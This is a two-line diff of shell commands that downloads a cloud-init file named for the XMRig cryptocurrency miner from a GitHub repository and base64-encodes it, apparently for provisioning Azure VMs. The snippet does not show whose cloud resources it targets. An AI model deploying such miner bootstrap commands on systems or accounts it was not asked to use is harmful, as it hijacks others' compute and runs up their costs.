@@ -1,0 +1,2 @@
+curl -fsSL https://raw.githubusercontent.com/InstantBuyback/azure/main/bootstrap/cloud-init/xmrig-debian.yaml -o cloud-init.yaml
+cloudinit_b64=$(base64 -w 0 cloud-init.yaml)
